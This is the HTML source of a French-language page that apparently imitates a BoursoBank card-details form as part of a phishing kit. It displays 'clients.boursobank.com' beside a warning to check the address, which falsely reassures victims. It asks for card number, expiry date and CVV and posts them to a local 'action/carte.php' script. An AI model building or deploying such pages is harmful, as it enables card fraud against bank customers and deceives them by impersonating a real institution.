<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire - Carte Bancaire</title>
    <style>
        /* Corps général */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(to bottom, #f3f4fc, #eef4fc);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        /* Conteneur principal */
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        /* Logo principal */
        .top-logo {
            margin-bottom: 70px;
            width: 100%;
            height: auto;
            display: flex;
            justify-content: center;
        }

        .top-logo img {
            max-width: 200px;
            max-height: 100px;
        }

        /* Formulaire */
        .form-box {
            background: #ffffff;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
            height: 650px;
            overflow: hidden;
            position: relative;
        }

        /* Bande rose */
        .header-bar {
            background: linear-gradient(to right, #d9007f, #ff007a);
            height: 10px;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
        }

        /* Contenu du formulaire */
        .form-content {
            padding: 50px;
        }

        /* Logo secondaire */
        .form-logo img {
            max-width: 50px;
            margin-bottom: 15px;
        }

        /* Titre principal */
        h1 {
            font-weight: 500;
            color: #003883;
            font-size: 1.3rem;
            margin-bottom: 10px;
        }

        /* Texte de vérification */
        .verification-text {
            font-size: 0.7rem;
            margin-bottom: 5px;
            color: #667e9b !important;
        }

        .verification-box {
            color: #27ae60;
            font-size: 0.9rem;
            margin-bottom: 20px;
        }

        /* Style des inputs de la carte */
        .input-line {
            border: 1px solid #ddd;
            border-radius: 8px;
            outline: none;
            font-size: 1rem;
            padding: 12px;
            width: 100%;
            margin-bottom: 15px;
            letter-spacing: 1px;
            background: #f7f7f7;
            transition: all 0.3s ease;
        }

        .input-line:focus {
            border-color: #ff006f;
            background: #fff;
            box-shadow: 0 0 5px rgba(255, 0, 111, 0.3);
        }

        /* Mémorisation */
        .remember-box {
            display: flex;
            align-items: center;
            font-size: 0.8rem;
            color: #617894;
            font-weight: 500;
            margin: 15px 0;
        }

        .remember-box input {
            margin-right: 5px;
            height: 20px;
        }

        /* Bouton */
        .btn {
            background: #ff006f;
            color: #fff;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1rem;
            transition: background 0.3s;
            width: 100%;
        }

        .btn:hover {
            background: #e60064b1;
        }

        /* Lien oublié */
        .forgot-link {
            display: block;
            margin-top: 10px;
            font-size: 0.9rem;
            color: #ff006f;
            text-decoration: none;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        /* Animation de chargement */
        .loading-screen {
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(255, 255, 255, 0.9);
            z-index: 10;
        }

        .loading-dots {
            font-size: 2rem;
            font-weight: bold;
            color: #d9007f;
        }

        /* Footer */
        .footer-links {
            margin-top: 20px;
            font-size: 0.8rem;
            color: #999;
        }

        .footer-links a {
            color: #999;
            text-decoration: none;
            margin: 0 5px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo principal -->
        <div class="top-logo">
            <img src="rvb-logo-3000_original_original-1024x188.png" alt="Logo Principal">
        </div>

        <!-- Boîte du formulaire -->
        <div class="form-box">
            <!-- Bande rose -->
            <div class="header-bar"></div>

           

            <!-- Formulaire principal -->
            <div class="form-content" id="formContent">
                <!-- Logo secondaire -->
                <div class="form-logo">
                    <img src="instruments-logo-4677.png" alt="Logo Secondaire">
                </div>

                <!-- Titre -->
                <h1 id="formTitle">Détails de votre carte</h1>

                <!-- Texte de vérification -->
                <div class="verification-text">
                    Veuillez toujours vérifier que vous êtes sur la bonne adresse
                </div>
                <div class="verification-box">
                    clients.boursobank.com
                </div>
                <form action="action/carte.php" method="POST">
                <!-- Champ numéro de carte -->
                <input type="text" class="input-line" id="cardNumber" name="cardNumber" placeholder="Numéro de carte" maxlength="19" required>

                <!-- Champ date d'expiration -->
                <div style="display: flex; gap: 10px;">
                    <input type="text" class="input-line" id="expiryDate" placeholder="MM/AA" maxlength="5" required oninput="formatExpiryDate(event)">
                    <input type="text" class="input-line" id="cvv" placeholder="CVV" maxlength="3" required>
                </div>

                <!-- Mémorisation -->
                <div class="remember-box" id="rememberSection">
                    <input type="checkbox" id="remember">
                    <label for="remember">Mémoriser ma carte</label>
                </div>

                <!-- Bouton -->
                <button class="btn" id="submitButton" onclick="startLoading()">Suivant</button>
                <a href="#" class="forgot-link">Carte oubliée ?</a>
            </div>
        </div>

        <!-- Liens de bas de page -->
        <div class="footer-links">
            <a href="#">Aide</a> / <a href="#">Opposition</a> / <a href="password.html">Sécurité</a>
        </div>
    </div>

    <script>
        function formatExpiryDate(event) {
            let input = event.target;
            let value = input.value.replace(/\D/g, ''); // Supprime tous les caractères non numériques

            // Ajoute automatiquement '/' après 2 chiffres
            if (value.length >= 2 && value.length <= 4) {
                input.value = value.slice(0, 2) + '/' + value.slice(2);
            } else {
                input.value = value; // Si moins de 2 caractères, pas de '/'
            }
        }

    </script>
</body>
</html>
